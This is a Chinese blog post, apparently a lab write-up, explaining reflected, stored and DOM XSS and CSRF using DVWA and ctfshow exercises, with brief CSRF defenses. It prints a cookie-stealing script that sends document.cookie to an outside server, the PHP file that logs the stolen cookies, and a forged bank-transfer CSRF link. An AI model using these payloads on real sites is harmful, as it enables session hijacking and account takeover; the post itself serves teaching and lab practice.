@@ -1,0 +1,268 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>浅说XSS和CSRF | XiLitter</title><meta name="author" content="XiLitter"><meta name="copyright" content="XiLitter"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="浅说XSS简介 跨站脚本是一种针对于前端的代码注入攻击，攻击者将恶意的JavaScript代码注入到过滤不严格的web网页中，当用户游览该网页时，JavaScript代码就会被执行，从而达到恶意攻击的目的。  XSS有三种类型，分别来说说。 反射型XSS通常情况下，恶意代码参数会注入在URL中，通过用户去点击链接，其中的恶意参数会被HTML解析，执行。非持久的，恶意代码不会注入到服务器中，每次执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅说XSS和CSRF">
+<meta property="og:url" content="https://xilitter.github.io/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/index.html">
+<meta property="og:site_name" content="XiLitter">
+<meta property="og:description" content="浅说XSS简介 跨站脚本是一种针对于前端的代码注入攻击，攻击者将恶意的JavaScript代码注入到过滤不严格的web网页中，当用户游览该网页时，JavaScript代码就会被执行，从而达到恶意攻击的目的。  XSS有三种类型，分别来说说。 反射型XSS通常情况下，恶意代码参数会注入在URL中，通过用户去点击链接，其中的恶意参数会被HTML解析，执行。非持久的，恶意代码不会注入到服务器中，每次执行">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xilitter.github.io/img/art01.jpg">
+<meta property="article:published_time" content="2023-02-16T13:31:22.000Z">
+<meta property="article:modified_time" content="2023-03-07T03:41:28.101Z">
+<meta property="article:author" content="XiLitter">
+<meta property="article:tag" content="CSRF">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xilitter.github.io/img/art01.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://xilitter.github.io/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '浅说XSS和CSRF',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-07 11:41:28'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/friend/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/art01.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="XiLitter"><span class="site-name">XiLitter</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/friend/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">浅说XSS和CSRF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-16T13:31:22.000Z" title="发表于 2023-02-16 21:31:22">2023-02-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-07T03:41:28.101Z" title="更新于 2023-03-07 11:41:28">2023-03-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="浅说XSS和CSRF"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="浅说XSS"><a href="#浅说XSS" class="headerlink" title="浅说XSS"></a>浅说XSS</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote>
+<p>跨站脚本是一种针对于前端的代码注入攻击，攻击者将恶意的JavaScript代码注入到过滤不严格的web网页中，当用户游览该网页时，JavaScript代码就会被执行，从而达到恶意攻击的目的。</p>
+</blockquote>
+<p>XSS有三种类型，分别来说说。</p>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>通常情况下，恶意代码参数会注入在URL中，通过用户去点击链接，其中的恶意参数会被HTML解析，执行。非持久的，恶意代码不会注入到服务器中，每次执行都需要用户去点击或者访问。</p>
+<p>DVWA靶场设置难度为low，源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">	<span class="comment">// Feedback for end user</span></span><br><span class="line">	<span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将用户输入与html拼接在一块，此处没有任何过滤，存在XSS。测试反射型XSS通常使用alert函数，</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/1.png" class>
+
+<p>有了反射型XSS究竟能干什么？当然是盗取cookie。在我们的公网ip上写一个接收cookie的php文件，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>打开ctfshow平台的XSS题目，输入恶意的JavaScript代码盗取cookie。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location=&quot;http://xilitter.top/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此时，我的服务器上就会生成一个cookie.txt文件。</p>
+<img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/2.png" class>
+
+<p>此时就获取到cookie，得到cookie就可以伪造用户登录了。上面那一行代码怎么获得cookie的？document.location返回一个Location对象，也就是映射一个URL，并且加载跳转到此URL上。document.cookie获取当前文档相关的cookie，拼接到恶意的URL中访问cookie.php，生成cookie.txt。</p>
+<h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>顾名思义，恶意的HTML代码会被存储到服务端的数据库或者文件中，每当用户去访问此页面时，注入的恶意代码就会被执行，持续攻击用户。存储型XSS大多出现在博客的评论当中。</p>
+<p>DVWA难度设置为low，源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	<span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">	<span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line">	<span class="comment">// Sanitize message input</span></span><br><span class="line">	<span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line">	<span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">	<span class="comment">// Sanitize name input</span></span><br><span class="line">	<span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">	<span class="comment">// Update database</span></span><br><span class="line">	<span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">	<span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>几个函数相关解释：</p>
+<blockquote>
+<p>trim函数 ： 移除string字符两侧的预定义字符，预定义字符包括\t 、 \n 、\x0B 、\r以及空格</p>
+<p>stripslashes函数： 去除掉string字符的反斜杠＼</p>
+<p>mysqli_real_escape_string函数 ：函数会对字符串string中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</p>
+</blockquote>
+<p>可以发现此代码并没有过滤HTML标签，并且会将我们输出的两个参数存储到数据库中。我们尝试输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/3.png" class>
+
+<p>会发现有弹窗，并且每次刷新此网页，就会弹窗，查看一下数据库</p>
+<img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/4.png" class>
+
+<p>恶意JavaScript代码确实被写入到数据库中了。接下来用ctfshow平台的web题演示一下存储型XSS获取管理员cookie。</p>
+<img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/5.png" class>
+
+<p>将此代码注入到服务端中，当管理员访问此页面，就会将管理员cookie带入到我们的服务器上。</p>
+<img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/6.png" class>
+
+<p>其中必有管理员的cookie，替换PHPSESSID就可以访问到管理员页面。</p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>什么是DOM？</p>
+<blockquote>
+<p>文档对象模型，是一种处理HTML和XML文件的标准API，提供了大量可用于操作文本内容的对象和方法。HTML文档被解析后，转化为DOM树，因此对HTML文档的处理可以通过对DOM树的操作实现。DOM模型不仅描述了文档的结构，还定义了结点对象的行为，利用对象的方法和属性，可以方便地访问、修改、添加和删除DOM树的结点和内容。</p>
+</blockquote>
+<p>一个简单的节点树</p>
+<img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/7.png" class>
+
+<p>JavaScript可以通过对象模型动态创建修改HTML节点。当JavaScript对DOM树不安全的处理数据时，可能会造成XSS。这种DOM型的XSS不与服务端进行交互，而是直接操作前端的HTML代码来达到攻击的目的。所以这种XSS隐秘性很好，只通过服务端的日志和数据库很难发现它。</p>
+<p>继续使用DVWA来演示一下，由于DOM型的XSS不与服务端进行交互，所以源码是前端的JavaScript代码：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line">		<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br><span class="line">		<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span><br><span class="line">&#125;		    </span><br><span class="line">		<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);</span><br><span class="line">		<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);</span><br><span class="line">		<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);</span><br><span class="line">		<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>检查这个URL中是否存在default参数，如果有，将参数的值添加到DOM树中。很明显，代码没有对用户的输入进行检查，此处存在DOM型的XSS。提交参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">localhost/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有弹窗，而且在我们的前端代码中发现提交的JavaScript代码写进DOM树里了。</p>
+<img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/8.png" class>
+
+<p>XSS参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/306031.html">DOM型的XSS</a>                                                        <a target="_blank" rel="noopener" href="https://blog.csdn.net/Silver_lion/article/details/107945099">反射型XSS</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/285123.html">XSS综合指南</a>                                                         <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/50324316">什么是DOM</a></p>
+<h2 id="浅说CSRF"><a href="#浅说CSRF" class="headerlink" title="浅说CSRF"></a>浅说CSRF</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><blockquote>
+<p>跨站请求伪造，当用户与被攻击网站持续会话，攻击者诱导受害者去点击攻击者恶意构造的链接，第三方网站向被攻击网站发送跨站请求，此时第三方网站已经获取到了会话凭证，绕过网站用户验证，伪造用户对被攻击网站进行恶意操作。</p>
+</blockquote>
+<p>CSRF攻击流程图：</p>
+<img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/9.png" class>
+
+<p>举个例子，小王登录了一个银行页面并没有关闭，假设该页面的源码为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$money</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;向 <span class="subst">$user</span> 转账成功，金额为 <span class="subst">$money</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时攻击者构造一个恶意的链接：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1/test/1.php?user=hacker&amp;money=1000&quot;</span>&gt;</span>点开有惊喜<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/10.png" class>
+
+<p>当用户忍不住点击，就向被攻击网站发送了请求。</p>
+<img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/11.png" class>
+
+<p>这是用GET方式发送的请求，当然还有POST方式。将上面代码替换为POST即可。POST方式要构造表单，可以利用burp工具来帮咱们完成。我们先访问1.php并赋上值抓包。</p>
+<img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/12.png" class>
+
+<p>选择burp自动生成CSRF的POC模块。</p>
+<img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/13.png" class>
+
+<p>将此代码复制粘贴到攻击者构造的恶意链接中。当用户访问</p>
+<img src="/2023/02/16/%E6%B5%85%E8%AF%B4XSS%E5%92%8CCSRF/14.png" class>
+
+<p>点击后，恶意请求就发送到被攻击网站。</p>
+<h3 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h3><blockquote>
+<p>Referer验证，Referer字段记录了该HTTP请求的来源地址，限制请求必须来自同一个网站，这么做安全性确实能大大提高，但是没了自由。另外Referer字段也是能够绕过的。</p>
+<p>Token验证，CSRF本质上是受害者自己攻击自己。当用户的验证信息都存在Cookie中，通过点击恶意链接，在用户不知情的情况下利用自己的身份凭证绕过了网站用户验证。开发者可以设置一个不能伪造的，随机的token值，在服务端建立一个拦截器来验证token，如果匹配的token不正确，则会拒绝此请求。</p>
+</blockquote>
+<p>CSRF参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/341591.html">CSRF入门及实战</a>                                                                        <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45728976/article/details/104506544">CSRF的利用</a></p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本次文章只是简单的说明了XSS和CSRF的特点以及利用，由于前端代码知识不是很了解，对DOM树操作的API之前也从来没看过，之后补上这些前端知识后，会在此文章上追加相关漏洞CTF题目讲解。</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API">API相关介绍</a></p>
